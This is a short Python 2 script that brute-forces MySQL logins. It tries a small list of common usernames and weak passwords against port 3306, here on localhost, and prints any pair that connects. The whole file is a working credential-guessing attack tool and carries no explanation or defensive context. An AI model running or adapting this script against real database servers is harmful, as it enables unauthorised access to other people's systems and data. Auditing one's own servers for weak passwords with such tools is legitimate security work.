#!/usr/bin/env python
# -*- coding: utf-8 -*-

import MySQLdb


user_dic = ['root','test','macmysql']
user_pwd = ['','root','12345','123456','macmysql@']

def brute(host):
	for user in user_dic:
		for pwd in user_pwd:
			try:
				conn = MySQLdb.connect(host = host, port = 3306, user=user, passwd= pwd)
				print '[*]Success user:{}\tpasswd:{}'.format(user, pwd)
			except Exception,e:
				# print e.__doc__
				pass


brute('127.0.0.1')